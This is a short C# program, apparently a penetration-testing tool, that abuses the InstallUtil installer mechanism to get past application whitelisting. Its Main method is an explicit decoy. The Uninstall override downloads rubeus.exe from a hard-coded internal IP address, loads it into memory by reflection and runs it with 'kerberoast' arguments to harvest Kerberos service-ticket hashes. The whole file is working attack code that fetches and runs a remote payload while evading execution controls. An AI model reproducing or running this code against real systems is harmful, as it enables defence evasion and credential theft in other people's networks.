using System;
using System.Reflection;
using System.Configuration.Install;
using System.IO;
using System.Net;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
        try
        {
            string url = "http://192.168.199.136/tools/rubeus.exe";

            WebClient client = new WebClient();

             byte[] executableBytes = client.DownloadData(url);
            Assembly assembly = Assembly.Load(executableBytes);
            MethodInfo entryPoint = assembly.EntryPoint;
            if (entryPoint != null)
            {
                object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[] { "kerberoast","/nowrap" } };
                entryPoint.Invoke(null, parameters);
            }
            else
            {
                Console.WriteLine("The loaded assembly does not have an entry point.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("An exception occured: " + ex.Message);
        }
        }
    }
}
